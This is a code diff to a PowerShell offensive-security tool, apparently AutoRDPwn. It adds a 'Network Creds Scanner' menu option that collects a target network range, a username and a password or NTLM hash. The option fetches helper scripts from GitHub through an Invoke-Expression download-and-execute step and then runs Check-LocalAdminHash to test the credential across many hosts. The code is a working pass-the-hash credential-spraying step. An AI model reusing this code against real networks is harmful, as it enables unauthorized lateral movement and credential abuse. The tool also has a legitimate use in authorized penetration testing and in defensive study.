@@ -368,8 +368,9 @@ function Remove-Exclusions {
 
         if($module -like '3') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - TCP Port Scan" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Port Forwarding" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Native Port Forwarding" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Network Creds Scanner" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
@@ -414,8 +415,36 @@ function Remove-Exclusions {
 
         if($networking -like '3') { $webserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
 
+        if($networking -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
+        Write-Host ; & $question ; Write-Host "$txt55" -NoNewLine -ForegroundColor Gray ; do { $scansystem = $Host.UI.ReadLine()
+        if(!$scansystem) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scansystem )
+        Write-Host ; & $question ; Write-Host "$txt78" -NoNewLine -ForegroundColor Gray ; do { $scanuser = $Host.UI.ReadLine()
+        if(!$scanuser) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanuser )
+        
+        Write-Host ; & $question ; Write-Host "$txt83" -NoNewLine -ForegroundColor Gray ; do { $scanmethod = $Host.UI.ReadLine()
+        if(!$scanmethod) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanmethod )
+        
+        if($scanmethod -like "hash") {
+        Write-Host ; & $question ; Write-Host "$txt84" -NoNewLine -ForegroundColor Gray ; do { $scanpass = $Host.UI.ReadLine()
+        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanpass )}
+        
+        if($scanmethod -like "pass") {
+        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; do { $scanpass = $Host.UI.ReadLineAsSecureString()
+        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanpass )}
+
+        Write-Host ; & $question ; Write-Host "$txt85" -NoNewLine -ForegroundColor Gray ; do { $scanprotocol = $Host.UI.ReadLine()
+        if(!$scanprotocol) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanprotocol )
+
+        if($scanmethod -like "pass") { if ($local){ Import-Module .\Resources\Scripts\Get-NTLM.ps1 } else { 
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Get-NTLM.ps1')}
+        Import-Module .\Get-NTLM ; $scanpass = ConvertFrom-SecureToPlain $scanpass ; $scanpass = Get-NTLM $scanpass }
+        
+        if ($local){ Import-Module .\Resources\Scripts\Check-LocalAdminHash.ps1 } else { 
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Check-LocalAdminHash.ps1')}
+        Check-LocalAdminHash -Username $scanuser -PasswordHash $scanpass -CIDR $scansystem -Protocol $scanprotocol -Threads 20 ; Write-Host ; pause }
+
         if($networking -like 'X'){ $input = 'x' ; continue }
-        if($networking -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
+        if($networking -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
    
         if($module -like '4') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
